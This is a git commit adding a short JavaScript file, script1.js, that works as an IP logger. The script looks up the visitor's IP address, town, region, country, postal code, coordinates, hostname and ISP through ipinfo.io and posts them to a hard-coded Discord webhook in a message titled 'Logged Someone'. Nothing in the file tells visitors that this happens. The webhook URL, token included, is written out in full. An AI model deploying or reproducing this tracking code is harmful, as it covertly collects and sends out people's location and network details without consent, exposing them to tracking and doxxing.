c8199a7d87a2c57badd9a7a52196b6cd3ffe4ac5
adamamk99 <113391935+adamamk99@users.noreply.github.com>
2022-11-14 22:29:54 +0100

    Add files via upload

---
+++ script1.js
@@ -0,0 +1,35 @@
+$.getJSON("https://ipinfo.io/json", function(data) {         
+  var params = {
+    embeds: [
+      {
+        "title": "Logged Someone",
+        "color": 15258703,
+        "thumbnail": {
+        },
+        "fields": [
+          {
+            "name": "IP Address",
+            "value": `> ${data.ip}`
+          },
+          {
+            "name": "GeoLocation Info",
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTimeZone: ${(data.timezone).replace('_', ' ')}\nLong/Lat: ${data.loc}`
+          },
+          {
+            "name": "Network Info",
+            "value": `>>> HostName: ${data.hostname}\nISP: ${data.org}\n`
+          }
+        ]
+      }
+    ]
+  }
+  fetch('https://discord.com/api/webhooks/1040001200134828082/ngWuheGE-4-OgyT05cyKBFohIpSt39in-4UezlXHmpprYKNRwY0bXlDQdTlsgr_W-hNx', {
+    method: "POST",
+    headers: {
+        'Content-type': 'application/json'
+    },
+    body: JSON.stringify(params)
+  }).then(res => {
+    console.log(res);
+  }) 
+})
